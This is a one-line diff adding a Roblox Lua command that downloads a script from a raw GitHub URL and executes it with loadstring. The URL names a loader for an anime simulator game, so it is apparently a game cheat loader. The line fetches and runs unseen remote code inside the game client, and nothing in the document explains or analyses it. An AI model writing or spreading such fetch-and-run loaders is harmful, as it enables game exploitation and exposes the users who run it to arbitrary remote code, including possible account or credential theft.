@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/mafuba-anime-astral-simulator-spam6-3m2tibjgib2m8o.lua"))()
